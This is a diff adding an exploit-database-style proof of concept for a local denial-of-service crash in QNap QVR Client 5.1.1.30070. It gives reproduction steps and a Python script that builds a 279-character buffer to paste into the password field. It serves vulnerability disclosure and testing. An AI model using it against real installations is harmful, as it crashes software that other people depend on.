@@ -1,0 +1,25 @@
+# Exploit Title: QNap QVR Client 5.1.1.30070 - 'Password' Denial of Service (PoC)
+# Discovery by: Luis Martínez
+# Discovery Date: 2018-07-26
+# Vendor Homepage: https://www.qnapsecurity.com/n/en/
+# Software Link : http://download.qnap.com/Surveillance/QVRClient/Qmon_5.1.1.30070.zip
+# Tested Version: 5.1.1.30070
+# Vulnerability Type:   Denial of Service (DoS) Local
+# Tested on OS:         Windows 10 Pro x64 es
+
+# Steps to Produce the Crash: 
+# 1.- Run python code : python QNap_QVR_Client_5.1.1.30070.py
+# 2.- Open QNap_QVR_Client_5.1.1.30070.txt and copy content to clipboard
+# 3.- Open QVR.exe
+# 4.- Direccion IP/Puerto -> 10.10.10.1 / 80
+# 5.- Username -> admin
+# 6.- Paste ClipBoard on Password
+# 7.- OK
+# 8.- Crashed
+
+#!/usr/bin/env python
+
+buffer = "\x41" * 279
+f = open ("QNap_QVR_Client_5.1.1.30070.txt", "w")
+f.write(buffer)
+f.close()
